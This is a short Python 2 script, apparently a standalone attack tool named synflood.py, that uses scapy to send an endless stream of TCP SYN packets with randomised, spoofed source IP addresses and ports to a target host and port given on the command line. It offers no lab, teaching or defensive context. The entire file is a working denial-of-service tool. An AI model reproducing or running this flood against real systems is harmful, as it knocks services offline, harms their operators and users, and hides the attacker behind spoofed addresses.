#!/usr/bin/env python
#author Aiden

import socket, random, sys,re 
from scapy.all import *

if len(sys.argv) != 3:
	print "Usage: synflood.py <target> <port>"
	sys.exit(1) 
victim = sys.argv[1]
port = int(sys.argv[2])
sys.tracebacklimit=0

class SYNflood:
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

		def run(self):
			self.check()
			i = IP()
			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			randomip = i.src
			i.dst = target

			t = TCP()
			t.sport = random.randint(1,65535)
			randomport = t.sport
			t.dport = port
			t.flags = 'S'

			send(i/t, verbose=0)

			print "{0}:{1} --> {2}:{3}".format(randomip,randomport,target,port)

	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)
syn = SYNflood()
while True:
	syn.run()
